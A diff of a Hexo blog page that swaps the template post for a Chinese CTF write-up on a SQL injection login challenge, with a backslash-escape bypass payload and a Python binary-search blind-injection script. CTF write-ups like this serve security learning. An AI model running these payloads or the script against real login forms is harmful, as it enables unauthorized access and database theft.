@@ -6,19 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hello World | Xun9er&#39;s blog</title>
+  <title>BJDCTF2nd | Xun9er&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="burp fuzz学到了，，俺再也不要手工测过滤了QAQ。利用 Burpsuite Fuzz 实现 SQL 注入   robots.txt提示提示有hint.txt访问如下：  Only u input the correct password then u can get the flag and p3rh4ps wants a girl friend.  select * from users">
+<meta name="keywords" content="随笔,ctf,sqli">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2019/10/06/hello-world/index.html">
+<meta property="og:title" content="BJDCTF2nd">
+<meta property="og:url" content="http://yoursite.com/2020/03/25/BJDCTF2nd/index.html">
 <meta property="og:site_name" content="Xun9er&#39;s blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="burp fuzz学到了，，俺再也不要手工测过滤了QAQ。利用 Burpsuite Fuzz 实现 SQL 注入   robots.txt提示提示有hint.txt访问如下：  Only u input the correct password then u can get the flag and p3rh4ps wants a girl friend.  select * from users">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-10-06T09:17:55.817Z">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/PvNYdcqfLxoh9SB.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/QnZT3aHcMX1SKWt.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/5YMSP1hZqxFutsb.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/FAMSKQ35qgBewYN.png">
+<meta property="og:updated_time" content="2020-03-25T09:09:26.492Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="BJDCTF2nd">
+<meta name="twitter:description" content="burp fuzz学到了，，俺再也不要手工测过滤了QAQ。利用 Burpsuite Fuzz 实现 SQL 注入   robots.txt提示提示有hint.txt访问如下：  Only u input the correct password then u can get the flag and p3rh4ps wants a girl friend.  select * from users">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png">
   
     <link rel="alternative" href="/atom.xml" title="Xun9er&#39;s blog" type="application/atom+xml">
   
@@ -169,20 +176,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-BJDCTF2nd" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      BJDCTF2nd
     </h1>
   
 
         
-        <a href="/2019/10/06/hello-world/" class="archive-article-date">
-  	<time datetime="2019-10-06T09:17:55.817Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-06</time>
+        <a href="/2020/03/25/BJDCTF2nd/" class="archive-article-date">
+  	<time datetime="2020-03-25T09:08:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-25</time>
 </a>
     <!--字数统计-->
         
@@ -191,7 +198,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">73字</span>
+        <span class="post-count">432字</span>
       </span>
     </span>
 
@@ -200,7 +207,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">2分</span>
       </span>
     </span>
 </div>
@@ -211,19 +218,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+        <h1 id="burp-fuzz"><a href="#burp-fuzz" class="headerlink" title="burp fuzz"></a>burp fuzz</h1><p>学到了，，俺再也不要手工测过滤了QAQ。<a href="https://segmentfault.com/a/1190000018748071" target="_blank" rel="noopener">利用 Burpsuite Fuzz 实现 SQL 注入</a><br><img src="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png" alt="sqli 3.png"><br><img src="https://i.loli.net/2020/03/25/PvNYdcqfLxoh9SB.png" alt="sqli 4.png">  </p>
+<h1 id="robots-txt提示"><a href="#robots-txt提示" class="headerlink" title="robots.txt提示"></a>robots.txt提示</h1><p>提示有hint.txt<br>访问如下：</p>
+<pre>
+Only u input the correct password then u can get the flag
+and p3rh4ps wants a girl friend.
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+select * from users where username='$_POST["username"]' and password='$_POST["password"]';
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+//鍑洪浜哄洓绾у帇绾挎墠杩� 瑙佽皡瑙佽皡 棰嗕細绮剧
+</pre>
+<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>后来从分享会上知道了可以用\来转义username后面的单引号。<br><img src="https://i.loli.net/2020/03/25/QnZT3aHcMX1SKWt.png" alt="sqli1.png"><br>payload：<code>username=admin\&amp;password=&#39;or 1#</code><br>带入得：<code>select * from users where username=&#39;admin\&#39; and password=&#39;&#39;or 1#&#39;</code>  </p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>已知为1时返回页面有：“you know …..girlfriend”,为0时返回“BDJ needs to be stronger”。<br>所以把这里的1换成判断语句就可以开始盲注了,又把之前的拿来改改：<br>这里传\的时候最开始不知道怎么传上去，因为它直接转义了后面的内容噗，后来从师傅们那里知道了要用俩，python会自动转义一次。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://bad6a7d7-7c67-4b08-8083-fbda7d88b93e.node3.buuoj.cn&quot;</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;#定义一个空字符串</span><br><span class="line"></span><br><span class="line">for i in range(1,20):	</span><br><span class="line">	low=32</span><br><span class="line">	high=126</span><br><span class="line">	mid=(low+high)//2## 二分法</span><br><span class="line">	while high&gt;low:</span><br><span class="line">		</span><br><span class="line">		#payload=&apos;or ascii(substr((database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		payload=&apos;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		data=&#123;</span><br><span class="line">			&apos;username&apos;:&apos;admin \\&apos;,</span><br><span class="line">			&apos;password&apos;:payload</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		r=requests.post(url,data=data)	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		if &apos;stronger&apos; in r.text:</span><br><span class="line">			low = mid+1</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">		else:</span><br><span class="line">			high=mid	</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">	flag+=chr(mid)#将ascii值转为字符</span><br><span class="line">	print(flag)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>ps：这里直接爆password就可以了，不用头铁去爆库爆表。。。database查出来了，但表名就查不了，至少我没查出来。<br><img src="https://i.loli.net/2020/03/25/5YMSP1hZqxFutsb.png" alt="bjd sql1.png"><br>得到密码，登录。<br><img src="https://i.loli.net/2020/03/25/FAMSKQ35qgBewYN.png" alt="bjd sql2.png">  </p>
 
       
 
@@ -253,6 +262,25 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">sqli</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -303,7 +331,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/10/06/hello-world/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/03/25/BJDCTF2nd/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -317,15 +345,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/10/06/Welcome-to-Xun9er-blog/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Welcome to Xun9er&#39;s blog!!
-        
-      </div>
-    </a>
   
+    <a href="/2020/03/22/notes-on-checkio/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">notes on checkio</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
@@ -350,7 +374,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#burp-fuzz"><span class="toc-number">1.</span> <span class="toc-text">burp fuzz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#robots-txt提示"><span class="toc-number">2.</span> <span class="toc-text">robots.txt提示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass"><span class="toc-number">3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#脚本"><span class="toc-number">4.</span> <span class="toc-text">脚本</span></a></li></ol>
                     </div>
                 </span>
             </div>
